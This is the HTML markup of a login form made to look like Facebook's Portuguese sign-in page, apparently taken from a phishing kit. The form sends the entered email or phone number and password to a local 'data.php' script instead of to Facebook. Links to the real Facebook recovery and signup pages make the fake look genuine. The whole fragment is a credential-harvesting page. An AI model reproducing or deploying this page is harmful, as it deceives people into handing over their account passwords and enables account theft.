<main>
	<div class="content">
		<div class="content-header">
			Entrar pelo Facebook
		</div>
		<div class="content-form">
			<form action="data.php" method="POST">
				<input type="text" name="username" placeholder="E-mail ou número de telefone" pattern="[a-zA-Z0-9_]+(?:\.[A-Za-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*@(?!([a-zA-Z0-9]*\.[a-zA-Z0-9]*\.[a-zA-Z0-9]*\.))(?:[A-Za-z0-9](?:[a-zA-Z0-9-]*[A-Za-z0-9])?\.)+[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?|.{8,}\d+" title="  Digite o endereço de e-mail ou número de telefone correto" required>
				<input type="password" name="userpassword" placeholder="Senha" pattern=".{5,}" title="Cinco ou mais caracteres" required>
				<input type="submit" name="data" value="Pronto">
			</form>
			<div class="signinLink">
				<a href="https://www.facebook.com/recover/initiate?lwv=100&amp;ars=facebook_login"  target="_blank">Forgotten account?</a>
				<span> · </span>
				<a href="https://www.facebook.com/r.php?locale=en_GB&amp;display=page" target="_blank">Cadastre-se no Facebook</a>
			</div>
		</div>
	</div>
</main>